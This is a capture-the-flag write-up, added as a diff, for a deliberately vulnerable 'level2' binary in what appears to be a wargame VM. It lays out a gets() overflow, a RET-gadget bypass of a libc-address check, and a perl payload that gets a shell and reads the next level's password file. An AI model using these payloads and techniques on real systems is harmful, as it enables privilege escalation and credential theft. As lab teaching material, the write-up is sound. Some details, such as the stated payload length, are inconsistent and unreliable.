@@ -1,0 +1,161 @@
+## Level2 - Buffer Overflow with RET Gadget Chain Exploit
+
+### Solution Summary
+The binary has a return address validation check that blocks addresses in the 0xb0xxxxxx range (libc). To bypass this, use a RET gadget chain - jump to a RET instruction in the binary code, which then pops and jumps to system().
+
+### Step 1: Extract Binary from VM
+```bash
+sshpass -p '<level1_password>' scp -P 4242 level2@localhost:/home/user/level2/level2 ./level2
+```
+
+### Step 2: Analyze the Vulnerability
+
+**Function p():**
+- Allocates 104 bytes on stack
+- Buffer at EBP-0x4c (76 bytes)
+- Return address at EBP+4
+- After gets(), it reads EBP+4 and validates it
+
+**The Check:**
+```
+and    $0xb0000000,%eax
+cmp    $0xb0000000,%eax
+jne    8048527     # Jump if NOT equal (i.e., if NOT in libc range)
+```
+
+If the return address is NOT in the 0xb0xxxxxx range, it continues normally.
+If it IS in that range, it prints "Nope" and exits.
+
+### Step 3: Find the RET Gadget
+
+Use objdump to find a RET instruction in the binary:
+```bash
+objdump -d ./level2 | grep -B 2 -A 1 "ret$"
+```
+
+Found RET gadget at: **0x0804853e** (in the p() function)
+
+### Step 4: Craft the Payload
+
+The RET gadget trick:
+1. Overflow the return address to point to the RET gadget at 0x0804853e
+2. This address passes the check: (0x0804853e & 0xb0000000) = 0
+3. When the function returns, it jumps to the RET gadget
+4. The RET instruction pops the next value from stack into EIP
+5. That next value is system() - now called without hitting the check again!
+
+**Payload (80 bytes):**
+```
+[76 bytes] "A" * 76
+[4 bytes]  RET gadget address: 0x0804853e
+[4 bytes]  system() address:   0xb7e6b060
+[4 bytes]  exit() address:     0xb7e5ebe0
+[4 bytes]  "/bin/sh" pointer:  0xb7f8cc58
+```
+
+### Step 5: Find Libc Addresses
+
+On the target VM (ASLR disabled):
+```bash
+gdb -batch <<'EOF'
+file /home/user/level2/level2
+break main
+run < /dev/null
+print/x (int)system
+print/x (int)exit
+find 0xb7e00000, 0xb8000000, "/bin/sh"
+quit
+EOF
+```
+
+Typical addresses (if ASLR unchanged):
+- system() @ 0xb7e6b060
+- exit() @  0xb7e5ebe0
+- "/bin/sh" @ 0xb7f8cc58
+
+### Step 6: Execute on VM
+
+```bash
+ssh level2@<VM_IP> -p 4242
+
+# Create payload
+perl -e 'print "A" x 76 . "\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7"' > /tmp/payload
+
+# Run exploit
+(cat /tmp/payload; echo "whoami"; echo "id"; echo "cat /home/user/level3/.pass"; echo "exit") | ./level2
+```
+
+You should see:
+```
+level3
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) ...
+[LEVEL3 PASSWORD]
+```
+
+### Binary Disassembly Details
+
+**Main function (0x804853f):**
+```
+804853f:  55                   push   %ebp
+8048540:  89 e5                mov    %esp,%ebp
+8048542:  83 e4 f0             and    $0xfffffff0,%esp
+8048545:  e8 8a ff ff ff       call   804 84d4 <p>
+804854a:  c9                   leave
+804854b:  c3                   ret
+```
+
+**P function (0x80484d4):**
+```
+80484d4:  55                   push   %ebp
+80484d5:  89 e5                mov    %esp,%ebp
+80484d7:  83 ec 68             sub    $0x68,%esp        # 104 bytes allocated
+80484da:  ...
+80484e7:  8d 45 b4             lea    -0x4c(%ebp),%eax  # Buffer at EBP-0x4c
+80484ea:  89 04 24             mov    %eax,(%esp)
+80484ed:  e8 ce fe ff ff       call   80483c0 <gets@plt>  # VULNERABLE!
+...
+80484f2:  8b 45 04             mov    0x4(%ebp),%eax    # Load return address
+80484f5:  89 45 f4             mov    %eax,-0xc(%ebp)   # Save for validation
+80484f8:  8b 45 f4             mov    -0xc(%ebp),%eax   # Reload
+80484fb:  25 00 00 00 b0       and    $0xb0000000,%eax  # Mask high bits
+8048500:  3d 00 00 00 b0       cmp    $0xb0000000,%eax  # Check vs libc mask
+8048505:  75 20                jne    8048527           # Jump if NOT libc
+8048507:  ...                                          # Print "Nope" if libc
+8048527:  ...                                          # Continue if NOT libc
+804852d:  e8 be fe ff ff       call   80483f0 <puts@plt>
+8048535:  e8 a3 fe ff ff       call   80483e0 <strdup@plt>
+804853d:  c9                   leave
+804853e:  c3                   ret   # <-- RET GADGET
+```
+
+### Why This Works
+
+1. Standard ret2libc is blocked by the address check
+2. By jumping to a RET gadget in the binary (0x0804853e), we bypass the initial check
+3. The RET gadget pops system() from the stack and jumps to it
+4. The second jump (to system) is never validated because only the first return address is checked
+5. system() spawns /bin/sh with level3 privileges
+6. Read /home/user/level3/.pass to get the password
+
+### Key Constraints
+- ASLR: Disabled (addresses are fixed)
+- NX: Disabled (stack executable, though we don't execute code on stack in this solution)
+- Only need 76 bytes to reach the return address
+- The RET gadget is at a fixed address in the binary: 0x0804853e
+
+### Verification
+
+To verify the gadget:
+```bash
+objdump -d ./level2 | grep -n "0804853e"
+# Should show: 804853e:  c3                   ret
+```
+
+To verify buffer offset:
+```bash
+gdb ./level2
+(gdb) break *0x80484ed
+(gdb) run
+(gdb) print $ebp - 0x4c
+# This gives the buffer address
+```
